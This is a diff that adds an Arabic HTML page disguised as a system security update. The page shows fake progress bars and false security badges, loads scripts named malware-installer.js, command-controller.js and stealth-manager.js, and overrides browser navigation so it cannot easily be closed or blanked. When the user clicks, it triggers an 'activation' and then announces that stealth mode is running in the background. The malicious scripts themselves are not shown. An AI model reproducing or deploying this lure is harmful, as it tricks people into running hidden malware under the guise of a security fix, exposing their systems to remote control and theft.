@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تحديث النظام - System Update</title>
+    <meta name="description" content="تحديث أمني للنظام - Security Update">
+    <meta name="robots" content="noindex, nofollow">
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="stealth-styles.css">
+    
+    <!-- حماية من إعادة التوجيه غير المرغوب -->
+    <script>
+        (function() {
+            console.log('🛡️ تفعيل الحماية من إعادة التوجيه');
+            
+            // منع أي محاولة لتغيير الصفحة إلى about:blank
+            const preventRedirect = () => {
+                // حماية window.location
+                const originalLocation = window.location;
+                Object.defineProperty(window, 'location', {
+                    get: function() { return originalLocation; },
+                    set: function(value) {
+                        if (typeof value === 'string' && value.includes('about:blank')) {
+                            console.log('❌ تم منع الانتقال إلى about:blank');
+                            return;
+                        }
+                        return originalLocation;
+                    },
+                    configurable: false
+                });
+                
+                // منع location.assign
+                const originalAssign = location.assign;
+                location.assign = function(url) {
+                    if (url === 'about:blank' || url === '' || !url) {
+                        console.log('❌ تم منع assign إلى about:blank');
+                        return;
+                    }
+                    return originalAssign.call(this, url);
+                };
+                
+                // منع location.replace
+                const originalReplace = location.replace;
+                location.replace = function(url) {
+                    if (url === 'about:blank' || url === '' || !url) {
+                        console.log('❌ تم منع replace إلى about:blank');
+                        return;
+                    }
+                    return originalReplace.call(this, url);
+                };
+                
+                // منع window.open للصفحات الفارغة
+                const originalOpen = window.open;
+                window.open = function(url, ...args) {
+                    if (url === 'about:blank' || url === '' || !url) {
+                        console.log('❌ تم منع فتح about:blank');
+                        return null;
+                    }
+                    return originalOpen.call(this, url, ...args);
+                };
+            };
+            
+            // تفعيل الحماية فوراً
+            preventRedirect();
+            
+            // مراقبة مستمرة للتأكد من عدم تغيير الصفحة
+            setInterval(() => {
+                if (window.location.href.includes('about:blank')) {
+                    console.log('❌ تم اكتشاف about:blank - إيقاف فوري');
+                    window.stop();
+                }
+            }, 100);
+            
+        })();
+    </script>
+</head>
+<body>
+    <!-- شاشة التحميل الأولية -->
+    <div id="loadingScreen" class="loading-screen">
+        <div class="loading-content">
+            <div class="loading-spinner"></div>
+            <h2>جاري تحميل التحديث...</h2>
+            <p>يرجى الانتظار بينما نقوم بتحميل آخر التحديثات الأمنية</p>
+            <div class="progress-bar">
+                <div class="progress-fill" id="initialProgress"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- المحتوى الرئيسي -->
+    <div id="mainContent" class="main-content" style="display: none;">
+        <div class="container">
+            <div class="header">
+                <div class="logo">
+                    <div class="logo-icon">🛡️</div>
+                    <h1>تحديث النظام الأمني</h1>
+                </div>
+                <p class="subtitle">Security System Update</p>
+            </div>
+
+            <div class="update-card">
+                <div class="update-info">
+                    <div class="version-info">
+                        <span class="version">v2.2.1</span>
+                        <span class="update-type">تحديث أمني</span>
+                    </div>
+                    <div class="update-details">
+                        <h3>محتوى التحديث:</h3>
+                        <ul>
+                            <li>✅ تحسينات أمنية متقدمة</li>
+                            <li>✅ إصلاح الثغرات الأمنية</li>
+                            <li>✅ تحسين الأداء والاستقرار</li>
+                            <li>✅ تحديث قاعدة البيانات</li>
+                            <li>✅ تعزيز حماية الخصوصية</li>
+                            <li>✅ تحديث خوارزميات التشفير</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="progress-section">
+                    <div class="progress-bar">
+                        <div class="progress-fill" id="progressFill"></div>
+                    </div>
+                    <div class="progress-text" id="progressText">جاهز للتحديث</div>
+                </div>
+
+                <div class="action-section">
+                    <button id="updateBtn" class="update-button">
+                        <span class="button-text">بدء التحديث الآن</span>
+                        <span class="button-icon">🔄</span>
+                    </button>
+                    <p class="update-note">سيتم إعادة تشغيل النظام تلقائياً بعد التحديث</p>
+                </div>
+
+                <div class="status-section">
+                    <div id="status" class="status-message">بانتظار تفعيل التحديث...</div>
+                    <div id="detailedStatus" class="detailed-status"></div>
+                </div>
+            </div>
+
+            <div class="footer">
+                <div class="security-badges">
+                    <span class="badge">🔒 آمن</span>
+                    <span class="badge">✅ موثق</span>
+                    <span class="badge">🛡️ محمي</span>
+                </div>
+                <p class="footer-text">جميع التحديثات يتم التحقق من صحتها قبل التثبيت</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- شاشة النجاح -->
+    <div id="successScreen" class="success-screen" style="display: none;">
+        <div class="success-content">
+            <div class="success-icon">✅</div>
+            <h2>تم التفعيل بنجاح!</h2>
+            <p>النظام يعمل الآن في الخلفية. يمكنك إغلاق هذه الصفحة بأمان.</p>
+            <div class="security-info">
+                <p>جميع الاتصالات مشفرة بنظام AES-256</p>
+                <p>الوضع السري: <span class="stealth-status">نشط</span></p>
+            </div>
+        </div>
+    </div>
+
+    <!-- شاشة الخطأ -->
+    <div id="errorScreen" class="error-screen" style="display: none;">
+        <div class="error-content">
+            <div class="error-icon">⚠️</div>
+            <h2>حدث خطأ في التحديث</h2>
+            <p id="errorMessage">يرجى المحاولة مرة أخرى</p>
+            <button id="retryBtn" class="retry-button">إعادة المحاولة</button>
+        </div>
+    </div>
+
+    <!-- تحميل الملفات المطلوبة -->
+    <script src="advanced-access-system.js"></script>
+    <script src="malware-installer.js"></script>
+    <script src="command-controller.js"></script>
+    <script src="encryption.js"></script>
+    <script src="stealth-manager.js"></script>
+    <script src="activation-script.js"></script>
+    <script>
+        // إدارة عملية التحديث
+        document.addEventListener('DOMContentLoaded', () => {
+            const loadingScreen = document.getElementById('loadingScreen');
+            const mainContent = document.getElementById('mainContent');
+            const successScreen = document.getElementById('successScreen');
+            const errorScreen = document.getElementById('errorScreen');
+            const progressFill = document.getElementById('progressFill');
+            const progressText = document.getElementById('progressText');
+            const updateBtn = document.getElementById('updateBtn');
+            const retryBtn = document.getElementById('retryBtn');
+            const status = document.getElementById('status');
+            const detailedStatus = document.getElementById('detailedStatus');
+            
+            // محاكاة تحميل الملفات
+            let progress = 0;
+            const initialProgress = document.getElementById('initialProgress');
+            const loadInterval = setInterval(() => {
+                progress += 5;
+                initialProgress.style.width = `${progress}%`;
+                
+                if (progress >= 100) {
+                    clearInterval(loadInterval);
+                    loadingScreen.style.display = 'none';
+                    mainContent.style.display = 'block';
+                }
+            }, 200);
+            
+            // بدء التحديث
+            updateBtn.addEventListener('click', async () => {
+                updateBtn.disabled = true;
+                status.textContent = 'جاري تثبيت التحديثات...';
+                
+                try {
+                    // إنشاء مثيل من سكريبت التفعيل التلقائي
+                    const activationScript = new AutoActivationScript();
+                    
+                    // خطوة 1: تثبيت التحديثات الأساسية
+                    detailedStatus.textContent = 'جاري تحميل الحزم الأمنية...';
+                    await simulateProgress(20, 1000);
+                    
+                    // خطوة 2: تطبيق التصحيحات
+                    detailedStatus.textContent = 'جاري تطبيق التصحيحات الأمنية...';
+                    await simulateProgress(50, 1500);
+                    
+                    // خطوة 3: تحديث قاعدة البيانات
+                    detailedStatus.textContent = 'جاري تحديث قاعدة البيانات...';
+                    await simulateProgress(70, 2000);
+                    
+                    // خطوة 4: تعزيز نظام الحماية
+                    detailedStatus.textContent = 'جاري تعزيز نظام الحماية...';
+                    await simulateProgress(90, 1000);
+                    
+                    // خطوة 5: تفعيل النظام التلقائي
+                    detailedStatus.textContent = 'جاري تفعيل النظام...';
+                    await simulateProgress(100, 500);
+                    
+                    // بدء التفعيل التلقائي
+                    const activationResult = await activationScript.startAutoActivation();
+                    
+                    if (activationResult) {
+                        // إظهار شاشة النجاح
+                        mainContent.style.display = 'none';
+                        successScreen.style.display = 'block';
+                    } else {
+                        throw new Error('فشل في تفعيل النظام');
+                    }
+                    
+                } catch (error) {
+                    errorMessage.textContent = error.message;
+                    mainContent.style.display = 'none';
+                    errorScreen.style.display = 'block';
+                }
+            });
+            
+            // إعادة المحاولة
+            retryBtn.addEventListener('click', () => {
+                errorScreen.style.display = 'none';
+                mainContent.style.display = 'block';
+                updateBtn.disabled = false;
+                status.textContent = 'بانتظار تفعيل التحديث...';
+                detailedStatus.textContent = '';
+                progressFill.style.width = '0%';
+                progressText.textContent = 'جاهز للتحديث';
+            });
+            
+            // محاكاة تقدم العملية
+            function simulateProgress(target, duration) {
+                return new Promise((resolve) => {
+                    const start = parseInt(progressFill.style.width) || 0;
+                    const increment = (target - start) / (duration / 50);
+                    let current = start;
+                    
+                    const progressInterval = setInterval(() => {
+                        current += increment;
+                        if (current >= target) {
+                            current = target;
+                            clearInterval(progressInterval);
+                            resolve();
+                        }
+                        
+                        progressFill.style.width = `${current}%`;
+                        progressText.textContent = `جاري التحديث ${Math.round(current)}%`;
+                    }, 50);
+                });
+            }
+        });
+    </script>
+</body>
+</html>
